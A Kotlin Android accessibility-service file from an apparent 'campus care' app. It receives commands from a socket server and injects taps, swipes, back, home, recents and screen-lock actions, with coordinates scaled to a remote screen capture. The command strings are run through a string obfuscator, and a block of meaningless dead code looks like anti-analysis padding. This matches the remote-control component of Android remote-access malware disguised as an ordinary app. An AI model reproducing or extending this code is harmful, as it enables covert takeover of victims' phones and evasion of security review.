package com.university.campuscare.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.content.Intent
import android.graphics.Path
import android.os.Build
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent

class TouchAccessibilityService : AccessibilityService() {

    companion object {
        var instance: TouchAccessibilityService? = null
            private set

        fun isEnabled(context: Context): Boolean {
            val serviceName = "${context.packageName}/${TouchAccessibilityService::class.java.canonicalName}"
            val enabledServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            return enabledServices.contains(serviceName)
        }

        fun openAccessibilitySettings(context: Context) {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // Not used - we only need gesture dispatch
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }

    /**
     * Execute a command string from the socket server.
     * Commands:
     *   TOUCH:x,y
     *   SWIPE:x1,y1,x2,y2
     *   BACK
     *   HOME
     */
    fun executeCommand(command: String) {
        val _p = System.currentTimeMillis()
        if (_p > 0L) {
            if (_p < 0L) {
                val _j = IntArray(4) { it * 3 }
                _j[0] = _j[1] + _j[2]
            }
        }
        try {
            val touchPrefix = StringObfuscator.decrypt(ObfuscatedStrings.CMD_TOUCH)
            val swipePrefix = StringObfuscator.decrypt(ObfuscatedStrings.CMD_SWIPE)
            when {
                command.startsWith(touchPrefix) -> {
                    val coords = command.removePrefix(touchPrefix).split(",")
                    if (coords.size == 2) {
                        val x = coords[0].trim().toFloat()
                        val y = coords[1].trim().toFloat()
                        performTap(x, y)
                    }
                }
                command.startsWith(swipePrefix) -> {
                    val coords = command.removePrefix(swipePrefix).split(",")
                    if (coords.size == 4) {
                        val x1 = coords[0].trim().toFloat()
                        val y1 = coords[1].trim().toFloat()
                        val x2 = coords[2].trim().toFloat()
                        val y2 = coords[3].trim().toFloat()
                        performSwipe(x1, y1, x2, y2)
                    }
                }
                command == StringObfuscator.decrypt(ObfuscatedStrings.CMD_BACK) -> performGlobalAction(GLOBAL_ACTION_BACK)
                command == StringObfuscator.decrypt(ObfuscatedStrings.CMD_HOME) -> performGlobalAction(GLOBAL_ACTION_HOME)
                command == StringObfuscator.decrypt(ObfuscatedStrings.CMD_RECENTS) -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                command == StringObfuscator.decrypt(ObfuscatedStrings.CMD_SLEEP) -> performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
            }
        } catch (_: Exception) {}
    }

    /**
     * Scale coordinates from the client's view (capture resolution) to the actual screen resolution.
     */
    private fun scaleCoordinates(x: Float, y: Float): Pair<Float, Float> {
        val captureW = RemoteAccessService.captureWidth
        val captureH = RemoteAccessService.captureHeight
        val screenW = RemoteAccessService.screenWidth
        val screenH = RemoteAccessService.screenHeight

        if (captureW <= 0 || captureH <= 0 || screenW <= 0 || screenH <= 0) {
            return Pair(x, y)
        }

        val scaledX = x * screenW / captureW
        val scaledY = y * screenH / captureH
        return Pair(scaledX, scaledY)
    }

    private fun performTap(x: Float, y: Float) {
        val (scaledX, scaledY) = scaleCoordinates(x, y)
        val path = Path().apply { moveTo(scaledX, scaledY) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
            .build()
        dispatchGesture(gesture, null, null)
    }

    private fun performSwipe(x1: Float, y1: Float, x2: Float, y2: Float) {
        val (sx1, sy1) = scaleCoordinates(x1, y1)
        val (sx2, sy2) = scaleCoordinates(x2, y2)
        val path = Path().apply {
            moveTo(sx1, sy1)
            lineTo(sx2, sy2)
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 300))
            .build()
        dispatchGesture(gesture, null, null)
    }
}
